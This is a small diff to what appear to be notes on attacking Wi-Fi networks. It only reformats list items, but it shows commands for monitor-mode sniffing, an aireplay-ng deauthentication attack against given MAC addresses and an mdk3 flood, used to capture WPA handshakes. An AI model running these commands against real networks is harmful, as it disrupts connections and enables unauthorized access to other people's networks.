@@ -16,12 +16,12 @@ Basic:
 
 Sniffing the network:
 
-	- airmon-ng start wlan0
-	- airodump-ng start wlan0
+	airmon-ng start wlan0
+	airodump-ng start wlan0
 
 Start wireshark on wlan0mon and capture handshakes with one of these two commands:
 	
-	- aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlan0mon
-	- mdk3 wlan0mon
+	aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlan0mon
+	mdk3 wlan0mon
 
 Search on wireshark for desauthentification packets and EAPOL packets and then, continu the "Basic" process of capturing explained before.
